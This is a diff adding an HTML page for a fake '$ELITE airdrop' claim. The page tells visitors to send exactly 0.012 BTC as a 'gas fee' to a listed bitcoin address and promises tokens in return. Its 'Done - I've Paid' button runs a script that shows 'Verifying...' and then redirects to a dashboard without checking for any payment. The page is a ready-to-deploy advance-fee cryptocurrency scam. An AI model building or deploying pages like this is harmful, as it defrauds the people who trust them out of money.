@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>TradeElite - Complete Claim</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            background: #0a0a1f; 
+            color: #00ff9d; 
+            padding: 40px 20px; 
+            margin: 0; 
+        }
+        h1 { color: white; font-size: 28px; margin-bottom: 10px; }
+        p { font-size: 18px; max-width: 600px; margin: 20px auto; }
+        .btc-box {
+            background: #1a1a2e;
+            border: 2px solid #00ff9d;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 30px auto;
+            max-width: 420px;
+            word-break: break-all;
+            font-size: 17px;
+            line-height: 1.6;
+        }
+        button { 
+            padding: 18px 50px; 
+            font-size: 22px; 
+            background: #00ff9d; 
+            color: black; 
+            border: none; 
+            border-radius: 12px; 
+            cursor: pointer; 
+            margin-top: 30px; 
+            font-weight: bold; 
+            width: 100%;
+            max-width: 320px;
+        }
+        .done-btn {
+            background: linear-gradient(90deg, #00ff9d, #00cc7a);
+        }
+    </style>
+</head>
+<body>
+    <h1>Complete Your Claim</h1>
+    <p>To finalize your $ELITE airdrop, please send the gas fee in BTC.</p>
+    
+    <div class="btc-box">
+        <strong>Send exactly 0.012 BTC to this address:</strong><br><br>
+        <span style="color:#00ff9d; font-family: monospace;">bc1qzlnqyx3x3tmatem0cvgtnnenjdd0zcrq45yua9</span>
+    </div>
+
+    <p style="font-size:14px; color:#ffaa00;">Once payment is received, your tokens will be automatically sent.</p>
+
+    <button class="done-btn" onclick="goToDashboard()">Done - I've Paid</button>
+
+    <script>
+        function goToDashboard() {
+            const btn = document.querySelector('.done-btn');
+            btn.textContent = "Verifying...";
+            btn.disabled = true;
+
+            // Immediately go to dashboard.html when "Done" is clicked
+            setTimeout(() => {
+                window.location.href = "dashboard.html";
+            }, 1200);
+        }
+    </script>
+</body>
+</html>
